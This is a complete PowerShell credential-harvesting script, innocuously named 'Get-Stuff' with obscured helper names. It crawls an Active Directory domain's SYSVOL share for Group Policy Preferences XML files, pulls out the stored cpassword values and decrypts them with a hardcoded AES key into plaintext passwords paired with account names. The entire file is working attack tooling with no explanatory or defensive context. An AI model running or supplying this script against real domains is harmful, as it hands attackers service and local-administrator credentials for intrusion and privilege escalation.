function Get-Stuff {
    
    [CmdletBinding()]
    Param (
            [ValidateNotNullOrEmpty()]
            [String]
            $Server = $Env:USERDNSDOMAIN
    )
    
    #Some XML issues between versions
    Set-StrictMode -Version 2
    
    #define helper function that decodes and decrypts password
    function Get-DCWD {
        [CmdletBinding()]
        Param (
            [string] $CPWD 
        )

        try {
            #Append appropriate padding based on string length  
            $Mod = ($CPWD.length % 4)
            
            switch ($Mod) {
            '1' {$CPWD = $CPWD.Substring(0,$CPWD.Length -1)}
            '2' {$CPWD += ('=' * (4 - $Mod))}
            '3' {$CPWD += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($CPWD)
            
            #Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
            #Set IV to all nulls to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length) 
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DXPSObject = $AesObject.CreateDecryptor() 
            [Byte[]] $OutBlock = $DXPSObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        } 
        
        catch {Write-Error $Error[0]}
    }  
    
    #define helper function to parse fields from xml files
    function Get-GPPIFS {
    [CmdletBinding()]
        Param (
            $File
        )
    
        try {
            
            $Filename = Split-Path $File -Leaf
            [xml] $Xml = Get-Content ($File)

            $CPWD = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()
    
            if ($Xml.innerxml -like "*cpassword*"){
            
                Write-Verbose "Potential password in $File"
                
                switch ($Filename) {

                    'Groups.xml' {
                        $CPWD += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Services.xml' {  
                        $CPWD += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Scheduledtasks.xml' {
                        $CPWD += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'DataSources.xml' { 
                        $CPWD += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                    }
                    
                    'Printers.xml' { 
                        $CPWD += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
  
                    'Drives.xml' { 
                        $CPWD += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                    }
                }
           }
                     
           foreach ($Pass in $CPWD) {
               Write-Verbose "Decrypting $Pass"
               $DPWDyptedPassword = Get-DCWD $Pass
               Write-Verbose "Decrypted a password of $DPWDyptedPassword"
               #append any new passwords to array
               $Password += , $DPWDyptedPassword
           }
            
            #put [BLANK] in variables
            if (!($Password)) {$Password = '[BLANK]'}
            if (!($UserName)) {$UserName = '[BLANK]'}
            if (!($Changed)) {$Changed = '[BLANK]'}
            if (!($NewName)) {$NewName = '[BLANK]'}
                  
            #Create custom object to output results
            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}
                
            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Verbose "The password is between {} and may be more than one value."
            if ($ResultsObject) {Return $ResultsObject} 
        }

        catch {Write-Error $Error[0]}
    }
    
    try {
        #ensure that machine is domain joined and script is running as a domain account
        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
            throw 'Machine is not a domain member or User is not a member of the domain.'
        }

        #discover potential files containing passwords ; not complaining in case of denied access to a directory
        Write-Verbose "Searching \\$Server\SYSVOL. This could take a while."
        $XMlFiles = Get-ChildItem -Path "\\$Server\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
    
        if ( -not $XMlFiles ) {throw 'No preference files found.'}

        Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
    
        foreach ($File in $XMLFiles) {
            $Result = (Get-GPPIFS $File.Fullname)
            Write-Output $Result
        }
    }

    catch {Write-Error $Error[0]}
}